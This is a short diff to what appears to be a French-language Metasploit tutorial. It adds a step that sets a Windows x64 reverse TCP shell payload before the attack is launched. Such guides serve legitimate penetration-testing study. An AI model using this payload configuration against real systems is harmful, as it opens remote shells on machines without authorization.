@@ -176,6 +176,12 @@ Exploit target:
 set _OPTION_ _VALUE_
 ```
 
+- Préparer le payload pour enclencher un reverse shell en tcp
+
+```
+set payload windows/x64/shell/reverse_tcp
+```
+
 - Lancez l'attaque
 
 ```
